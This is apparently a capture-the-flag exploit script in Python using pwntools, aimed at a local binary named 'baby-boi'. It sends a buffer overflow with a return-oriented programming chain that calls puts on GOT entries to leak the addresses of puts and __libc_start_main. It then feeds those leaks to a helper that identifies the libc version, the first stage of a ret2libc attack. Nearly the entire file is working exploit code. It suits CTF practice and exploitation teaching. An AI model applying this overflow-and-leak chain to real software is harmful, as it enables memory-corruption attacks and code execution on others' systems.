from pwn import *

import TheNight

import time

import sys

target = process("./chall-test_localLibcId-baby-boi")
payload = ""
payload += "0000000000000000000000000000000000000000"
payload += p64(0x400793)
payload += p64(0x601018)
payload += p64(0x400560)
payload += p64(0x400793)
payload += p64(0x600ff0)
payload += p64(0x400560)
target.sendline(payload)
target.recvline()
target.recvline()
leak = target.recvuntil("\n").strip("\n")
gotAddress0 = u64(leak + "\x00"*(8-len(leak)))
leak = target.recvuntil("\n").strip("\n")
gotAddress1 = u64(leak + "\x00"*(8-len(leak)))
symbol0 = "puts"
symbol1 = "__libc_start_main"
TheNight.findLibcVersionAutomated("puts", gotAddress0, "__libc_start_main", gotAddress1)
